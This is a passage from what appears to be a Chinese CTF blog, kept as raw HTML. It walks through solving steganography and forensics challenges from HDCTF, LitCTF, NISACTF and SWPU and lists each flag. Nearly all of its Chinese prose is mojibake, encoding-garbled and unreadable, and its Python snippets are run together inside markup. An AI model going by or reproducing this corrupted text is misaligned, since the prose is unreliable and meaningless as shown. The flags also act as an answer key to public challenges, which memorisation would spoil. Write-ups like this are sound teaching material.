punctuation">,</span>pixel<span class="token punctuation">)</span>new_image<span class="token punctuation">.</span>save<span class="token punctuation">(</span><span class="token string">"flag.png"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://imag.keyblue.cn/imag/202309041428100.png" alt="flag"></p><p>ç„¶åå¯ä»¥ä½¿ç”¨zstegæŸ¥çœ‹å›¾ç‰‡éšå†™</p><p><img src="https://imag.keyblue.cn/imag/202309041431243.png" alt="image-20230904143120214"></p><p>ä¹Ÿå¯ä»¥ä½¿ç”¨stegsolveæŸ¥çœ‹</p><p><img src="https://imag.keyblue.cn/imag/202309041432780.png" alt="image-20230904143206750"></p><pre class="line-numbers language-none"><code class="language-none">flag&#123;J3st_2_cats_battling&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="HDCTF-2023-hardMisc"><a href="#HDCTF-2023-hardMisc" class="headerlink" title="[HDCTF 2023]hardMisc"></a>[HDCTF 2023]hardMisc</h1><p> æ‰“å¼€å‹ç¼©åŒ…ï¼Œæ˜¯ä¸ªå›¾ç‰‡</p><p><img src="https://imag.keyblue.cn/imag/202308301218216.png" alt="image-20230830121850165"></p><p>ç›´æ¥æ‹‰åˆ°kaliåˆ†ç¦»</p><p><img src="https://imag.keyblue.cn/imag/202308301219218.png" alt="image-20230830121950171"></p><p>æ²¡æœ‰ä¸œè¥¿ï¼Œéšæœºä½¿ç”¨010æ‰“å¼€</p><p><img src="https://imag.keyblue.cn/imag/202308301220202.png" alt="image-20230830122057163"></p><p>å†…å®¹å¦‚ä¸‹</p><pre class="line-numbers language-none"><code class="language-none">SERDVEZ7d0UxYzB3M18xMF9IRGN0Zl9NMTVjfQ&#x3D;&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è§£ç å°±æ˜¯flagï¼šHDCTF{wE1c0w3_10_HDctf_M15c}</p><h1 id="HUBUCTF-2022-æ–°ç”Ÿèµ›-æœ€ç®€å•çš„misc"><a href="#HUBUCTF-2022-æ–°ç”Ÿèµ›-æœ€ç®€å•çš„misc" class="headerlink" title="[HUBUCTF 2022 æ–°ç”Ÿèµ›]æœ€ç®€å•çš„misc"></a>[HUBUCTF 2022 æ–°ç”Ÿèµ›]æœ€ç®€å•çš„misc</h1><p>æ‰“å¼€æ–‡ä»¶æ˜¯ä¸€ä¸ªå›¾ç‰‡</p><p><img src="https://imag.keyblue.cn/imag/202308311029117.png" alt="image-20230831102912950"></p><p>ç›´æ¥ç”¨010æ‰“å¼€å›¾ç‰‡ï¼Œæ²¡æœ‰å‘ç°</p><p>æŠŠæ–‡ä»¶æ‹‰åˆ°kaliè¿›è¡Œåˆ†ç¦»ï¼Œæ²¡æœ‰å‘ç°</p><p>zstegæµ‹è¯•ï¼Œå‘ç°lsbéšå†™</p><p><img src="https://imag.keyblue.cn/imag/202308311042725.png" alt="image-20230831104259676"></p><p>ç›´æ¥ä½¿ç”¨å‘½ä»¤æå–</p><p><img src="https://imag.keyblue.cn/imag/202308311046549.png" alt="image-20230831104659519"></p><p>æ‰“å¼€1.pngå‘ç°æ˜¯ä¸ªäºŒç»´ç </p><p><img src="https://imag.keyblue.cn/imag/202308311047211.png" alt="image-20230831104731175"></p><p>ä½¿ç”¨CaptfEncoderè§£ç </p><p><img src="https://imag.keyblue.cn/imag/202308311048413.png" alt="image-20230831104856358"></p><p>flagï¼š</p><pre class="line-numbers language-none"><code class="language-none">NSSCTF&#123;aacc4238460996f0178c18d7637c9dd5&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="LitCTF-2023-404notfound-åˆçº§"><a href="#LitCTF-2023-404notfound-åˆçº§" class="headerlink" title="[LitCTF 2023]404notfound (åˆçº§)"></a>[LitCTF 2023]404notfound (åˆçº§)</h1><p>è§£å‹ä¹‹åæ˜¯ä¸€ä¸ªå›¾ç‰‡</p><p><img src="https://imag.keyblue.cn/imag/202308281011008.png" alt="image-20230828101118969"></p><p>binwalkåˆ†ç¦»æ— æœ</p><p>ç”¨010æ‰“å¼€å›¾ç‰‡ï¼Œæ‹‰åˆ°æœ€åï¼Œæ²¡æœ‰å‘ç°æœ‰ç”¨çš„ä¿¡æ¯</p><p>åœ¨kalié‡Œä½¿ç”¨stringså‘½ä»¤æŸ¥çœ‹</p><p><img src="https://imag.keyblue.cn/imag/202308281022205.png" alt="image-20230828102243162"></p><p>å‘ç°flagå€¼ï¼šLitCTF{Its_404_but_1ts_n0t_a_page}</p><h1 id="LitCTF-2023-Osintå°éº¦æœæ±"><a href="#LitCTF-2023-Osintå°éº¦æœæ±" class="headerlink" title="[LitCTF 2023]Osintå°éº¦æœæ±"></a>[LitCTF 2023]Osintå°éº¦æœæ±</h1><p>ä½¿ç”¨binwalkåˆ†ç¦»ï¼Œæ²¡æœ‰æˆæœ</p><p>010æ‰“å¼€æ²¡æœ‰å‘ç°æœ‰ç”¨çš„ä¿¡æ¯</p><p>æ¶‰åŠåˆ°çŸ¥è¯†ç›²åŒºäº†ï¼Œæœæ–­çœ‹WPï¼ŒåŸæ¥æ˜¯ç¤¾å·¥é¢˜ï¼Œ</p><p>æ ¹æ®å¢™ä¸Šçš„wifiåç§°å¯ä»¥æœç´¢åˆ°åº—å</p><pre class="line-numbers language-none"><code class="language-none">é»‘å®¢ä¸ç²¾é…¿<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="LitCTF-2023-Take-me-hand-åˆçº§"><a href="#LitCTF-2023-Take-me-hand-åˆçº§" class="headerlink" title="[LitCTF 2023]Take me hand (åˆçº§)"></a>[LitCTF 2023]Take me hand (åˆçº§)</h1><p>æ‰“å¼€æµé‡åŒ…è¿‡æ»¤http</p><p><img src="https://imag.keyblue.cn/imag/202308291318257.png" alt="image-20230829131841214"></p><p>ç‚¹å¼€å…¶ä¸­ä¸€ä¸ªè¯·æ±‚åŒ…å¯ä»¥çœ‹åˆ°è¯·æ±‚å†…å®¹å°±æ˜¯flag</p><p><img src="https://imag.keyblue.cn/imag/202308291319812.png" alt="image-20230829131929775"></p><p>LitCTF{Give_y0ur_hand_to_me!!!_plz}</p><h1 id="LitCTF-2023-ç ´æŸçš„å›¾ç‰‡-åˆçº§"><a href="#LitCTF-2023-ç ´æŸçš„å›¾ç‰‡-åˆçº§" class="headerlink" title="[LitCTF 2023]ç ´æŸçš„å›¾ç‰‡(åˆçº§)"></a>[LitCTF 2023]ç ´æŸçš„å›¾ç‰‡(åˆçº§)</h1><p>æ‰“å¼€å‹ç¼©åŒ…ï¼Œé‡Œé¢æ˜¯ä¸€ä¸ªæ²¡æœ‰åç¼€åçš„æ–‡ä»¶</p><p><img src="https://imag.keyblue.cn/imag/202308311304019.png" alt="image-20230831130438973"></p><p>ç”¨010æ‰“å¼€ï¼Œå‘ç°æ–‡ä»¶å¤´ç¼ºå¤±äº†</p><p><img src="https://imag.keyblue.cn/imag/202308311306601.png" alt="image-20230831130655578"></p><p>ä¿®å¤æ–‡ä»¶å¤´</p><p><img src="https://imag.keyblue.cn/imag/202308311311610.png" alt="image-20230831131123578"></p><p>æˆåŠŸæ‰“å¼€æ–‡ä»¶</p><p><img src="https://imag.keyblue.cn/imag/202308311311413.png" alt="image-20230831131146253"></p><p>flag</p><pre class="line-numbers language-none"><code class="language-none">LitCTF&#123;May you, the beauty of this world, always shine.&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="LitCTF-2023-è¿™ç¾½æ¯›çƒæ€ä¹ˆåªæœ‰ä¸€åŠå•Šï¼ˆæ¼-åˆçº§"><a href="#LitCTF-2023-è¿™ç¾½æ¯›çƒæ€ä¹ˆåªæœ‰ä¸€åŠå•Šï¼ˆæ¼-åˆçº§" class="headerlink" title="[LitCTF 2023]è¿™ç¾½æ¯›çƒæ€ä¹ˆåªæœ‰ä¸€åŠå•Šï¼ˆæ¼ (åˆçº§)"></a>[LitCTF 2023]è¿™ç¾½æ¯›çƒæ€ä¹ˆåªæœ‰ä¸€åŠå•Šï¼ˆæ¼ (åˆçº§)</h1><p>å›¾ç‰‡åªæœ‰ä¸€åŠ</p><p><img src="https://imag.keyblue.cn/imag/202308281057421.png" alt="image-20230828105727274"></p><p>åº”è¯¥æ˜¯è¦çˆ†ç ´å›¾ç‰‡å®½é«˜</p><p>010ç›´æ¥æ›´æ”¹å›¾ç‰‡é«˜åº¦ï¼Œä¿å­˜æ‰“å¼€å›¾ç‰‡å¯ä»¥çœ‹åˆ°å®Œæ•´å›¾ç‰‡äº†</p><p><img src="https://imag.keyblue.cn/imag/202308281152722.png" alt="image-20230828115241690"></p><p><img src="https://imag.keyblue.cn/imag/202308281154576.png" alt="image-20230828115419501"></p><p><img src="https://imag.keyblue.cn/imag/202308281154939.png" alt="image-20230828115441917"></p><p>LitCTF{Fl4g_0fcourse!}</p><h1 id="NISACTF-2022-bilalaçš„äºŒç»´ç "><a href="#NISACTF-2022-bilalaçš„äºŒç»´ç " class="headerlink" title="[NISACTF 2022]bilalaçš„äºŒç»´ç "></a>[NISACTF 2022]bilalaçš„äºŒç»´ç </h1><p>binwalkåˆ†ç¦»ï¼Œæ— æœ</p><p>010æŸ¥çœ‹æ— æœ</p><p>åªèƒ½è¡¥å…¨äºŒç»´ç äº†</p><p><img src="https://imag.keyblue.cn/imag/202309041707302.png" alt="bilala1QRcode"></p><p>ä½¿ç”¨ç”»å›¾å·¥å…·è¡¥å…¨ä¸‰ä¸ªå®šä½è§’</p><p><img src="https://imag.keyblue.cn/imag/202309041708988.png" alt="image-20230904170841950"></p><p>å†ä½¿ç”¨QRResearchå·¥å…·æ‰«æäºŒç»´ç </p><p><img src="https://imag.keyblue.cn/imag/202309041709479.png" alt="image-20230904170921451"></p><p>è®¿é—®è§£ç å‡ºæ¥çš„é“¾æ¥ï¼Œä¸‹è½½ç½‘é¡µä¸­çš„å›¾ç‰‡ã€‚</p><p>foremoståˆ†ç¦»å‡ºæ¥ä¸€ä¸ªå‹ç¼©åŒ…<img src="https://imag.keyblue.cn/imag/202309041714621.png" alt="image-20230904171439602"></p><p>æ‹‰åˆ°windowsä¸‹ï¼Œéœ€è¦å¯†ç æ‰èƒ½è§£å¼€</p><p>ç”¨ARCHPRçˆ†ç ´</p><p><img src="https://imag.keyblue.cn/imag/202309041941238.png" alt="image-20230904194142210"></p><p>å‹ç¼©åŒ…å¯†ç <code>NiSA</code></p><p><img src="https://imag.keyblue.cn/imag/202309041946508.png" alt="image-20230904194632489"></p><p>ç”¨Audacityæ‰“å¼€mp3æ–‡ä»¶ï¼Œæ˜¯éŸ³é¢‘éšå†™</p><p><img src="https://imag.keyblue.cn/imag/202309041946815.png" alt="image-20230904194650780"></p><pre class="line-numbers language-none"><code class="language-none">.--. .- .-. - .---- ---... -- ----- .-. ... ...-- ....- -. -..<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è§£ç å¾—åˆ°</p><pre class="line-numbers language-none"><code class="language-none">PART1:M0RS34ND<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è¿™æ˜¯flagçš„å‰åŠæ®µï¼Œè¿™é‡Œè¿˜è¦åŠ ä¸Šä¸€ä¸ªå›¾ç‰‡çš„åˆ†è¾¨ç‡</p><p>æ˜¯é€šè¿‡foremoståˆ†ç¦»å‡ºæ¥çš„å¦å¤–ä¸€å¼ å›¾ç‰‡</p><p><img src="https://imag.keyblue.cn/imag/202309042003974.png" alt="image-20230904200352949"></p><p><img src="https://imag.keyblue.cn/imag/202309042004577.png" alt="image-20230904200422559"></p><p>è¿™å¦å¤–åŠæ®µå¯çœŸæ˜¯****</p><pre class="line-numbers language-none"><code class="language-none">NSSCTF&#123;M0RS34ND282X231&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="NISACTF-2022-bmpnumber"><a href="#NISACTF-2022-bmpnumber" class="headerlink" title="[NISACTF 2022]bmpnumber"></a>[NISACTF 2022]bmpnumber</h1><p>é¢˜ç›®çš„é™„ä»¶å›¾ç‰‡åç§°ä¸ºwb4ï¼Œä¸”ä¸ºbmpæ–‡ä»¶</p><p>è¿™æ˜¯åœ¨æç¤ºä½¿ç”¨wbStego4open</p><p><img src="https://imag.keyblue.cn/imag/202309051322583.png" alt="image-20230905132210543"></p><p>åˆ†ç¦»å‡ºä¸€ä¸ªç ´æŸçš„äºŒç»´ç å›¾ç‰‡</p><p><img src="https://imag.keyblue.cn/imag/202309051323330.png" alt="image-20230905132305306"></p><p>æˆ‘ä»¬ä½¿ç”¨windowsç”»å›¾å·¥å…·ä¿®å¤ä¸‰ä¸ªå®šä½è§’åè§£ç </p><p><img src="https://imag.keyblue.cn/imag/202309051324939.png" alt="image-20230905132451908"></p><p>è®¿é—®è§£ç åå¾—åˆ°çš„é“¾æ¥ï¼Œæç¤ºéœ€è¦å¯†ç </p><p><img src="https://imag.keyblue.cn/imag/202309051325353.png" alt="image-20230905132545321"></p><p>çœ‹äº†å‰é¢çš„æ­¥éª¤éƒ½æ²¡æœ‰å¯†ç æç¤ºï¼Œç½‘é¡µæç¤ºweakï¼Œå¯èƒ½æ˜¯å¼±å£ä»¤ï¼Œæœ€åçŒœå¯†ç æ˜¯<code>password</code></p><p>æ˜¯ä¸€ä¸ªdocxæ–‡ä»¶ï¼Œæ‰“å¼€æ–‡æ¡£ï¼Œå…¨é€‰æ”¹å­—ä½“é¢œè‰²çœ‹æœ‰æ²¡æœ‰é€æ˜å­—ï¼Œå‘ç°flagå°±åœ¨æœ€å</p><p><img src="https://imag.keyblue.cn/imag/202309051345963.png" alt="image-20230905134519938"></p><pre class="line-numbers language-none"><code class="language-none">flag&#123;this_is_you_need_flag!&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="NISACTF-2022-bqtå…ˆ"><a href="#NISACTF-2022-bqtå…ˆ" class="headerlink" title="[NISACTF 2022]bqtå…ˆ"></a>[NISACTF 2022]bqtå…ˆ</h1><p>å…ˆæ‹‰åˆ°kalié‡ŒæŸ¥çœ‹æ–‡ä»¶ç±»å‹</p><p><img src="https://imag.keyblue.cn/imag/202308281614423.png" alt="image-20230828161452394"></p><p>æ˜¯ä¸€ä¸ªpdfæ–‡ä»¶</p><p>binwalkåˆ†ç¦»æ— æœ</p><p>ä½¿ç”¨010æ‰“å¼€æ–‡ä»¶ï¼Œæ²¡æœ‰å‘ç°æœ‰ç”¨çš„ä¿¡æ¯</p><p>æœ€åæ‰“å¼€pdfæ–‡ä»¶æŸ¥çœ‹ï¼Œä½¿ç”¨ctrl+Aå…¨é€‰ï¼Œå‘ç°æ–‡æ¡£ä¸­é—´æœ‰å†…å®¹ï¼Œå¤åˆ¶æŸ¥çœ‹</p><pre class="line-numbers language-none"><code class="language-none">c8e9aca0c3f4e6e5f2a1a0d4e8e5a0e6ece1e7a0e9f3baa0e6ece1e7fbf7e5e6e5efe9e4eae7efe5e4f3e6e9eff2f0e5e6e4e6e7e7e6e4f3e5fd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ¯é—´éš”ä¸¤ä¸ªå­—ç¬¦åŠ ä¸ªç©ºæ ¼</p><pre class="line-numbers language-none"><code class="language-none">c8 e9 ac a0 c3 f4 e6 e5 f2 a1 a0 d4 e8 e5 a0 e6 ec e1 e7 a0 e9 f3 ba a0 e6 ec e1 e7 fb f7 e5 e6 e5 ef e9 e4 ea e7 ef e5 e4 f3 e6 e9 ef f2 f0 e5 e6 e4 e6 e7 e7 e6 e4 f3 e5 fd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è½¬æ¢æˆ10è¿›åˆ¶</p><pre class="line-numbers language-none"><code class="language-none">200 233 172 160 195 244 230 229 242 161 160 212 232 229 160 230 236 225 231 160 233 243 186 160 230 236 225 231 251 247 229 230 229 239 233 228 234 231 239 229 228 243 230 233 239 242 240 229 230 228 230 231 231 230 228 243 229 253<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å› ä¸ºflagä¸€èˆ¬æœ€åä¸€ä¸ªå­—ç¬¦æ˜¯}</p><p>}å­—ç¬¦çš„ASCIIç åºå·æ˜¯125</p><p>253-125&#x3D;128ï¼Œå¯ä»¥æ¯ä¸ªå­—ç¬¦å‡128è¯•è¯•</p><pre class="line-numbers language-none"><code class="language-none">72 105 44 32 67 116 102 101 114 33 32 84 104 101 32 102 108 97 103 32 105 115 58 32 102 108 97 103 123 119 101 102 101 111 105 100 106 103 111 101 100 115 102 105 111 114 112 101 102 100 102 103 103 102 100 115 101 125<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ascllè§£ç å¾—åˆ°</p><pre class="line-numbers language-none"><code class="language-none">Hi, Ctfer! The flag is: flag&#123;wefeoidjgoedsfiorpefdfggfdse&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ¶å¿ƒ~</p><p>ä¸€èˆ¬flagéƒ½æ˜¯ç”¨}ç»“å°¾çš„  }çš„asciiåè¿›åˆ¶å€¼ä¸º125</p><h1 id="NISACTF-2022-huajiï¼Ÿ"><a href="#NISACTF-2022-huajiï¼Ÿ" class="headerlink" title="[NISACTF 2022]huajiï¼Ÿ"></a>[NISACTF 2022]huajiï¼Ÿ</h1><p>ä½¿ç”¨binwalkè¿›è¡Œåˆ†ç¦»</p><p><img src="https://imag.keyblue.cn/imag/202308271206557.png" alt="image-20230827120618515"></p><p>å¾—åˆ°çš„å‹ç¼©åŒ…éœ€è¦å¯†ç è§£å‹</p><p><img src="https://imag.keyblue.cn/imag/202308271208655.png" alt="image-20230827120802621"></p><p>æ‰¾ä¸åˆ°å¯†ç ï¼Œåœ¨åŸå›¾ç‰‡ä¸Šçœ‹çœ‹ï¼Œå‘ç°huajiï¼Ÿçš„å±æ€§é‡Œæœ‰ä¸€ä¸²å¥‡æ€ªçš„å­—ç¬¦<code>6374665f4e4953415f32303232</code></p><p><img src="https://imag.keyblue.cn/imag/202308271216203.png" alt="image-20230827121638167"></p><p>å¯¹å…¶è¿›è¡Œascllè§£ç å¾—åˆ°<code>ctf_NISA_2022</code></p><p><img src="https://imag.keyblue.cn/imag/202308271218072.png" alt="image-20230827121857045"></p><p>ä½¿ç”¨è§£ç å­—ç¬¦å¯¹å‹ç¼©åŒ…è§£å‹ç¼©ï¼Œå¾—åˆ°flagå€¼<code>flag&#123;Nls@_FumYEnnOjy&#125;</code></p><h1 id="NISACTF-2022-ä¸ºä»€ä¹ˆæˆ‘ä»€ä¹ˆéƒ½çœ‹ä¸è§"><a href="#NISACTF-2022-ä¸ºä»€ä¹ˆæˆ‘ä»€ä¹ˆéƒ½çœ‹ä¸è§" class="headerlink" title="[NISACTF 2022]ä¸ºä»€ä¹ˆæˆ‘ä»€ä¹ˆéƒ½çœ‹ä¸è§"></a>[NISACTF 2022]ä¸ºä»€ä¹ˆæˆ‘ä»€ä¹ˆéƒ½çœ‹ä¸è§</h1><p>ä½¿ç”¨010æ‰“å¼€æ–‡ä»¶ï¼Œç ´æŸçš„PNGæ–‡ä»¶å¤´ï¼Œè¡¥å¥½</p><p><img src="https://imag.keyblue.cn/imag/202308271735376.png" alt="image-20230827173547339"></p><p>ç„¶åç»™æ–‡ä»¶åŠ ä¸Šåç¼€</p><p>åœ¨kaliä½¿ç”¨zstegæŸ¥çœ‹éšå†™</p><p><img src="https://imag.keyblue.cn/imag/202308271737376.png" alt="image-20230827173729331"></p><p>å¾—åˆ°flagå€¼NISA{Wlec0me_to_NiSa2022}</p><h1 id="NISACTF-2022-æµé‡åŒ…é‡Œæœ‰ä¸ªç†Š"><a href="#NISACTF-2022-æµé‡åŒ…é‡Œæœ‰ä¸ªç†Š" class="headerlink" title="[NISACTF 2022]æµé‡åŒ…é‡Œæœ‰ä¸ªç†Š"></a>[NISACTF 2022]æµé‡åŒ…é‡Œæœ‰ä¸ªç†Š</h1><p>æ‹¿åˆ°æ–‡ä»¶åå‘ç°æ²¡æœ‰åç¼€ï¼Œå…ˆæ‹‰åˆ°kaliåˆ†æ</p><p><img src="https://imag.keyblue.cn/imag/202309021611129.png" alt="image-20230902161138093"></p><p>é‰´å®šä¸ºpcapæ–‡ä»¶ï¼Œéšå³å¢åŠ åç¼€å</p><p>wiresharkæ‰“å¼€æµé‡åŒ…åˆ†æï¼Œå‘ç°æœ‰å°‘é‡HTTPè¯·æ±‚</p><p><img src="https://imag.keyblue.cn/imag/202309021618712.png" alt="image-20230902161835678"></p><p>å¯¼å‡ºè¢«è®¿é—®çš„å›¾ç‰‡</p><p><img src="https://imag.keyblue.cn/imag/202309021619756.png" alt="image-20230902161918732"></p><p>æ˜¯ä¸€å¤´ç†Šï¼Œä¹Ÿç®—æ˜¯ç¬¦åˆé¢˜æ„äº†ï¼Œä¼°è®¡flagå°±åœ¨å®ƒèº«ä¸Š</p><p><img src="https://imag.keyblue.cn/imag/202309021620311.png" alt="image-20230902162019277"></p><p>binwalkåˆ†æå›¾ç‰‡ï¼Œå‘ç°è¿˜éšè—ç€ä¸€ä¸ªRARå‹ç¼©åŒ…</p><p><img src="https://imag.keyblue.cn/imag/202309021622207.png" alt="image-20230902162210173"></p><p>ä½¿ç”¨<code>binwalk CuteBear.jpg -e</code>åˆ†ç¦»å‹ç¼©åŒ…</p><p>å‹ç¼©åŒ…é‡Œè¿˜æœ‰ä¸€ä¸ªå°ç†Šå›¾ç‰‡å’Œä¸¤ä¸ªflag</p><p>å¯¹å…¶ä¸­ä¸€ä¸ªflagæ–‡ä»¶è¿›è¡ŒBASE64è§£ç ï¼Œè¿™æ˜¯å‡çš„flag</p><p><img src="https://imag.keyblue.cn/imag/202309021627878.png" alt="image-20230902162722845"></p><p>æ‰“å¼€å¦ä¸€ä¸ªæ–‡æœ¬ï¼Œæ²¡æœ‰å‘ç°ä»€ä¹ˆï¼Œä¼¼ä¹æ˜¯ä¸€æ®µå¯†æ–‡ï¼Œå…ˆæ”¾ç€ï¼Œç­‰ä¼šåœ¨çœ‹</p><p><img src="https://imag.keyblue.cn/imag/202309021702434.png" alt="image-20230902170250395"></p><p>æˆ‘ä»¬æŠŠå‹ç¼©åŒ…é‡Œçš„å›¾ç‰‡å†æ¬¡åˆ†ç¦»ï¼Œå‘ç°å’Œä¸Šä¸€å±‚æœ‰ç‚¹ä¸ä¸€æ ·</p><p><img src="https://imag.keyblue.cn/imag/202309021704657.png" alt="image-20230902170405633"></p><p><img src="https://imag.keyblue.cn/imag/202309021704760.png" alt="image-20230902170439740"></p><p>ä¸¤ä¸ªä¸ªflag.txtå’Œä¸Šä¸€å±‚éƒ½æ˜¯ä¸€æ ·çš„ï¼Œå”¯ä¸€å˜çš„æ˜¯æ–‡ä»¶å¤¹çš„åç§°ï¼Œæ–‡ä»¶å¤¹åç§°å˜ä¸º13ï¼Œç»“åˆé‚£æ®µå¯†æ–‡å°è¯•è§£å¯†ï¼ŒçŒœæµ‹æœ‰å¯èƒ½æ˜¯ROT13åŠ å¯†ï¼Œéšå³è§£å¯†</p><p><img src="https://imag.keyblue.cn/imag/202309021707825.png" alt="image-20230902170716795"></p><p>æˆåŠŸè§£å¯†ï¼Œæ˜æ–‡å¼€å¤´ä¸ºFFD8ï¼Œæ˜¯JPEGæ–‡ä»¶æ²¡é”™äº†ï¼Œ010æ–°å»ºå¹¶å†™å…¥ä¿å­˜ä¸ºJPGæ–‡ä»¶</p><p><img src="https://imag.keyblue.cn/imag/202309021709996.png" alt="image-20230902170922965"></p><p>è¿™æ˜¯åŸå›¾</p><p><img src="https://imag.keyblue.cn/imag/202309021709673.jpg" alt="Untitled2"></p><p>åœ¨æ­¤å›¾ç‰‡ä¸Šæ²¡æœ‰å‘ç°å…¶ä»–éšè—ä¿¡æ¯ï¼Œæ‰€ä»¥åº”è¯¥æ˜¯ç›²æ°´å°</p><p>è¿™é‡Œä½¿ç”¨å¾çˆ±ç ´è§£è®ºå›å‘å¸ƒçš„WaterMarkè¿›è¡ŒæŸ¥çœ‹æ°´å°</p><p>è¿™é‡Œé™„å·¥å…·çš„ä¸‹è½½æ–¹å¼ï¼š<a href="https://www.jb51.net/softs/635870.html#downintro2">å·¥å…·ä¸‹è½½</a></p><p><img src="https://imag.keyblue.cn/imag/202309021829796.png" alt="image-20230902182929697"></p><p>å›¾ç‰‡éå¸¸æ¨¡ç³Šï¼Œ</p><pre class="line-numbers language-none"><code class="language-none">S0_clev2l_You<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="SWPU-2019-Network"><a href="#SWPU-2019-Network" class="headerlink" title="[SWPU 2019]Network"></a>[SWPU 2019]Network</h1><p>TTLéšå†™</p><pre class="line-numbers language-none"><code class="language-none">IPæŠ¥æ–‡åœ¨è·¯ç”±é—´ç©¿æ¢­çš„æ—¶å€™æ¯ç»è¿‡ä¸€ä¸ªè·¯ç”±ï¼ŒTTLå°±ä¼šå‡1ï¼Œå½“TTLä¸º0çš„æ—¶å€™ï¼Œè¯¥æŠ¥æ–‡å°±ä¼šè¢«ä¸¢å¼ƒã€‚TTLæ‰€å çš„ä½æ•°æ˜¯8ä½ï¼Œä¹Ÿå°±æ˜¯0-255çš„èŒƒå›´ï¼Œä½†æ˜¯åœ¨å¤§å¤šæ•°æƒ…å†µä¸‹é€šå¸¸åªéœ€è¦ç»è¿‡å¾ˆå°çš„è·³æ•°å°±èƒ½å®ŒæˆæŠ¥æ–‡çš„è½¬å‘ï¼Œè¿œè¿œæ¯”ä¸Šé™255å°å¾—å¤šï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç”¨TTLå€¼çš„å‰ä¸¤ä½æ¥è¿›è¡Œä¼ è¾“éšè—æ•°æ®ã€‚å¦‚ï¼šé¡»ä¼ é€Hå­—ç¬¦ï¼Œåªéœ€æŠŠHå­—ç¬¦æ¢æˆäºŒè¿›åˆ¶ï¼Œæ¯ä¸¤ä½ä¸ºä¸€ç»„ï¼Œæ¯æ¬¡å¡«å……åˆ°TTLå­—æ®µçš„å¼€å¤´ä¸¤ä½å¹¶æŠŠå‰©ä¸‹çš„6ä½è®¾ç½®ä¸º1ï¼ˆxx111111ï¼‰ï¼Œè¿™æ ·å‘4ä¸ªIPæŠ¥æ–‡å³å¯ä¼ é€1ä¸ªå­—èŠ‚ã€‚<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>æ ¹æ®ä¸Šè¿°è§„åˆ™ï¼Œå¯ä»¥çŸ¥é“TTLéšå†™ä¸­ç”¨åˆ°å››ä¸ªå€¼ï¼š<code>00 111111</code>ï¼ˆ63ï¼‰,<code>01 111111</code>ï¼ˆ127ï¼‰,<code>10 111111</code>ï¼ˆ191ï¼‰,<code>11 111111</code>ï¼ˆ255ï¼‰,è§£å¯†çš„æ—¶å€™åªå–å‰ä¸¤ä½ï¼Œç„¶åè½¬æ¢æˆascii<br> ç®€åŒ–ä¸€ä¸‹ï¼Œå¯ä»¥è¿™ä¹ˆè®¤ä¸ºï¼š<br> ç”¨</p><pre class="line-numbers language-none"><code class="language-none">00 æ›¿æ¢ 6301 æ›¿æ¢ 12710 æ›¿æ¢ 19111 æ›¿æ¢ 255<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> binasciidata <span class="token operator">=</span> <span class="token string">''</span>data_bin <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'res/attachment-2.txt'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    <span class="token keyword">for</span> line <span class="token keyword">in</span> f<span class="token punctuation">:</span>        line <span class="token operator">=</span> line        <span class="token keyword">if</span> <span class="token builtin">int</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">63</span><span class="token punctuation">:</span>            data_bin <span class="token operator">+=</span> <span class="token string">'00'</span>        <span class="token keyword">if</span> <span class="token builtin">int</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">127</span><span class="token punctuation">:</span>            data_bin <span class="token operator">+=</span> <span class="token string">'01'</span>        <span class="token keyword">if</span> <span class="token builtin">int</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">191</span><span class="token punctuation">:</span>            data_bin <span class="token operator">+=</span> <span class="token string">'10'</span>        <span class="token keyword">if</span> <span class="token builtin">int</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">255</span><span class="token punctuation">:</span>            data_bin <span class="token operator">+=</span> <span class="token string">'11'</span><span class="token keyword">print</span><span class="token punctuation">(</span>data_bin<span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>data_bin<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    data <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>data_bin<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token 